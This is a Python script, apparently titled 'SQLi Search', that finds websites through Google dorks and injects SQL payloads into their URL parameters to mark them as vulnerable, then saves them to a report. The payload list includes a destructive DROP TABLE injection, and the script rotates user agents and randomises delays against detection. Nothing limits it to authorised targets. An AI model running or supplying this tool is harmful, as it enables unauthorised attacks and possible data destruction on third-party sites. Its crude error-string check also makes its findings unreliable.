import os
import random
import logging
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
import csv
import dns.resolver
from typing import List, Set

DEFAULT_SCANNED_URLS_FILE = 'scanned_urls.txt'
DEFAULT_USER_AGENT_FILE = 'user_agents.txt'
DEFAULT_REPORT_FILE = 'report.csv'
DEFAULT_LOG_FILE = 'scanner.log'
MAX_VULNERABLE_URLS = 10
MAX_SEARCH_RESULTS = 100

# Setup logging
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
]

class SqlScan:
    def __init__(self, api_key: str, cse_id: str):
        self.api_key = api_key
        self.cse_id = cse_id
        self.results = {'vulnerable': [], 'not_vulnerable': [], 'errors': []}
        self.scanned_urls = self.load_scanned_urls(DEFAULT_SCANNED_URLS_FILE)
        self.user_agents = self.load_user_agents(DEFAULT_USER_AGENT_FILE)

    def load_user_agents(self, user_agent_file: str) -> List[str]:
        if os.path.exists(user_agent_file):
            with open(user_agent_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        logging.warning(f"{user_agent_file} not found. Using default user agents.")
        return DEFAULT_USER_AGENTS.copy()

    def load_scanned_urls(self, scanned_urls_file: str) -> Set[str]:
        if os.path.exists(scanned_urls_file):
            with open(scanned_urls_file, 'r') as f:
                return {line.strip() for line in f}
        logging.info(f"No scanned URLs found. Starting fresh.")
        return set()

    def save_scanned_url(self, url: str, scanned_urls_file: str):
        with open(scanned_urls_file, 'a') as f:
            f.write(url + '\n')
        logging.debug(f"Saved scanned URL: {url}")

    def dorking(self, dork: str, max_page: int) -> List[str]:
        search_url = "https://www.googleapis.com/customsearch/v1"
        urls = []

        for start in range(1, max_page * 10, 10):
            params = {
                'q': dork,
                'key': self.api_key,
                'cx': self.cse_id,
                'start': start,
                'num': 10
            }
            headers = {'User-Agent': random.choice(self.user_agents)}

            try:
                response = requests.get(search_url, headers=headers, params=params)
                response.raise_for_status()
                items = response.json().get('items', [])
                for item in items:
                    urls.append(item['link'])
                logging.info(f"Fetched {len(items)} URLs from Google Custom Search API.")
            except requests.exceptions.RequestException as e:
                logging.error(f"Error fetching URLs: {e}")

        return urls

    def extract_valid_urls(self, urls: List[str]) -> List[str]:
        valid_urls = {url for url in urls if self.is_valid_url(url)}
        logging.info(f"Extracted {len(valid_urls)} valid URLs.")
        return list(valid_urls)

    def is_valid_url(self, url: str) -> bool:
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        sql_params = ['id', 'item', 'product', 'user', 'uid', 'pid']
        return any(param in query_params for param in sql_params)

    def check_vulnerability(self, url: str) -> bool:
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        payloads = [
            "'", "' OR '1'='1", "' AND '1'='2", "' OR 'x'='x", "';--",
            "') OR ('1'='1", "' UNION SELECT NULL, NULL, NULL--", "'; DROP TABLE users;--",
            "' OR '1'='1' /*", "' OR '1'='1' -- "
        ]

        for param, original_values in query.items():
            for original_value in original_values:
                for payload in payloads:
                    injected_value = original_value + payload
                    query[param] = [injected_value]
                    new_query = urlencode(query, doseq=True)
                    test_url = urlunparse(parsed_url._replace(query=new_query))

                    try:
                        response = requests.get(test_url, timeout=10)

                        if any(error in response.text.lower() for error in ["error", "mysql", "syntax", "sql", "warning"]):
                            logging.info(f"[VULN] {url} => (Param: {param}) with payload: {payload}")
                            return True
                    except requests.exceptions.RequestException:
                        logging.info(f"[NO VULN] {url} => Request failed")

        return False

    def resolve_domain(self, url: str):
        domain_name = urlparse(url).netloc
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ["8.8.8.8", "1.1.1.1"]

        try:
            answers = resolver.resolve(domain_name, "A")
            for answer in answers:
                logging.debug(f"A record for {domain_name}: {answer.to_text()}")
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN) as e:
            logging.warning(f"DNS resolution failed for {domain_name}: {e}")
        except dns.exception.DNSException as e:
            logging.error(f"DNS error for {domain_name}: {e}")

    def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
        vulnerable_urls = []
        start = 1

        while len(vulnerable_urls) < max_vulnerable and start <= MAX_SEARCH_RESULTS:
            urls = self.dorking(dork, start)
            if not urls:
                logging.info("No more URLs fetched.")
                break

            valid_urls = self.extract_valid_urls(urls)
            if not valid_urls:
                logging.info("No valid URLs found.")
                break

            with ThreadPoolExecutor(max_workers=10) as executor:
                results = executor.map(self.check_vulnerability, valid_urls)

            vulnerable_urls.extend([url for url, result in zip(valid_urls, results) if result])

            for url in valid_urls:
                self.save_scanned_url(url, DEFAULT_SCANNED_URLS_FILE)

            start += 10
            logging.info(f"Fetched and checked {len(valid_urls)} URLs. Total: {len(vulnerable_urls)} vulnerable URLs found.")
            time.sleep(random.uniform(2, 4))

        return vulnerable_urls


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text: str) -> str:
    terminal_width = os.get_terminal_size().columns
    lines = text.split('\n')
    centered_lines = [line.strip().center(terminal_width) for line in lines]
    return '\n'.join(centered_lines)

def get_api_credentials():
    clear_console()

    text1 = "\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n" \
            "\t\tSQLi Search\n" \
            "\t\t by => xfnx\n\n" \
            "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n"

    text2 = "Before using the tool, you must provide your Google Custom Search API key and Custom Search Engine ID."

    print(center_text(text1))
    print(center_text(text2))

    api_key = input("\nYour Google Custom Search API key: ")
    cse_id = input("Your Google Custom Search Engine ID: ")

    return api_key, cse_id


def get_dork_and_options():
    dork = input('Dork (example="inurl:product?id="): ')
    max_vuln = int(input('Max Vuln (Number): '))
    save_report = input("Want the result to be saved (Y/N): ").strip().lower() == 'y'
    return dork, max_vuln, save_report

def write_report(vulnerable_urls, filename):
    with open(filename, 'w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["Vulnerable URLs"])
        for url in vulnerable_urls:
            writer.writerow([url])

def main():
    try:
        api_key, cse_id = get_api_credentials()
        scanner = SqlScan(api_key, cse_id)

        dork, max_vuln, save_report = get_dork_and_options()

        clear_console()
        print("Scanning started...")

        vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
        if vulnerable_urls:
            print("\n[VULNERABLE] Vulnerable URLs found:")
            for url in vulnerable_urls:
                print(url)

            if save_report:
                write_report(vulnerable_urls, DEFAULT_REPORT_FILE)
                print(f"Results saved to {DEFAULT_REPORT_FILE}")

    except KeyboardInterrupt:
        print("\nScan interrupted by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
